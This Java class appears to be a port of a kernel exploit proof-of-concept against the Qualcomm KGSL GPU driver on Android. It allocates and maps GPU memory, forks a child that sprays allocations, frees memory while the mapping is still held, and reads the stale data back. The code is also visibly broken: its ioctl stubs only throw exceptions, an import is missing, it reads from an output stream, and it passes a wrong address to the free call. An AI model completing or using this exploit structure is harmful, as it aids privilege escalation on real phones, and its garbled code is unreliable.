import android.os.ParcelFileDescriptor;
import android.os.SystemClock;
import android.system.Os;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.MappedByteBuffer;
import java.nio.channels.FileChannel;
import java.util.concurrent.TimeUnit;

public class KGSLTest {

    private static final String TAG = "KGSLTest";
    private ParcelFileDescriptor kgslFd;
    private FileOutputStream pipeOut;
    private MappedByteBuffer gpuMappedBuffer;

    public KGSLTest() {
        // Initialize resources
        try {
            kgslFd = ParcelFileDescriptor.open(new File("/dev/kgsl-3d0"), ParcelFileDescriptor.MODE_READ_WRITE);
            pipeOut = new FileOutputStream(new FileDescriptor());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void allocateAndMapMemory() {
        KgslGpumemAlloc kga = allocateGpuMemory();
        mapGpuMemory(kga.gpuaddr);
    }

    public void runChildProcess() {
        int child = osFork();
        if (child == 0) {
            osPrctl(1, 9);
            if (osGetppid() == 1) {
                System.exit(0);
            }
            childFunc();
            System.exit(0);
        }
    }

    public void readFromPipe() {
        try {
            TimeUnit.SECONDS.sleep(1);
            byte[] laterData = new byte[8];
            pipeOut.read(laterData);
            Log.d(TAG, "[p] read 0x" + Long.toHexString(ByteBuffer.wrap(laterData).getLong()));
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    public void freeMemory() {
        KgslSharedmemFree argSf = new KgslSharedmemFree();
        argSf.gpuaddr = gpuMappedBuffer.capacity();
        try {
            ioctl(kgslFd, IOCTL_KGSL_SHAREDMEM_FREE, argSf);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private KgslGpumemAlloc allocateGpuMemory() {
        KgslGpumemAlloc kga = new KgslGpumemAlloc();
        kga.size = 0x1000;
        kga.flags = (2 << KGSL_MEMALIGN_SHIFT) | KGSL_MEMFLAGS_USE_CPU_MAP | (KGSL_CACHEMODE_WRITEBACK << KGSL_CACHEMODE_SHIFT) | (KGSL_MEMTYPE_OBJECTANY << KGSL_MEMTYPE_SHIFT);
        try {
            ioctl(kgslFd, IOCTL_KGSL_GPUMEM_ALLOC, kga);
            Log.d(TAG, "[p] allocated 0x" + Long.toHexString(kga.gpuaddr));
        } catch (IOException e) {
            e.printStackTrace();
        }
        return kga;
    }

    private void mapGpuMemory(long gpuaddr) {
        try {
            gpuMappedBuffer = getMappedByteBuffer(kgslFd, gpuaddr, 0x1000);
            gpuMappedBuffer.putLong(0xaaaaaaaa);
            Log.d(TAG, "[p] mapped as " + gpuMappedBuffer);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void childFunc() {
        for (int i = 0; i < 10000; i++) {
            KgslGpumemAlloc kga = allocateGpuMemory();
            long gpuaddr = kga.gpuaddr;
            try {
                MappedByteBuffer map = getMappedByteBuffer(kgslFd, gpuaddr, 0x1000);
                map.putLong(0xbbbb000000000000L | i);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        Log.d(TAG, "[c] done with spam");
    }

    private static MappedByteBuffer getMappedByteBuffer(ParcelFileDescriptor kgslFd, long gpuaddr, int size) throws IOException {
        FileChannel channel = new FileInputStream(kgslFd.getFileDescriptor()).getChannel();
        return channel.map(FileChannel.MapMode.READ_WRITE, gpuaddr, size);
    }

    private int osFork() {
        try {
            return (int) Os.fork();
        } catch (IOException e) {
            e.printStackTrace();
            return -1;
        }
    }

    private void osPrctl(int option, int arg) {
        try {
            Os.prctl(option, arg, 0, 0, 0);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private int osGetppid() {
        try {
            return Os.getppid();
        } catch (IOException e) {
            e.printStackTrace();
            return -1;
        }
    }

    private static final int KGSL_MEMALIGN_SHIFT = 16;
    private static final int KGSL_MEMFLAGS_USE_CPU_MAP = 0x10000000;
    private static final int KGSL_CACHEMODE_SHIFT = 26;
    private static final int KGSL_CACHEMODE_WRITEBACK = 3;
    private static final int KGSL_MEMTYPE_SHIFT = 8;
    private static final int KGSL_MEMTYPE_OBJECTANY = 0;
    private static final int IOCTL_KGSL_GPUMEM_ALLOC = 0x4004b42f;
    private static final int IOCTL_KGSL_SHAREDMEM_FREE = 0x40042121;

    static class KgslGpumemAlloc {
        long gpuaddr;
        long size;
        int flags;
    }

    static class KgslSharedmemFree {
        long gpuaddr;
    }

    private void ioctl(ParcelFileDescriptor fd, int request, KgslGpumemAlloc arg) throws IOException {
        // Implement ioctl using other Android APIs or consider using a native interface
        throw new UnsupportedOperationException("ioctl not supported on Android");
    }

    private void ioctl(ParcelFileDescriptor fd, int request, KgslSharedmemFree arg) throws IOException {
        // Implement ioctl using other Android APIs or consider using a native interface
        throw new UnsupportedOperationException("ioctl not supported on Android");
    }
}
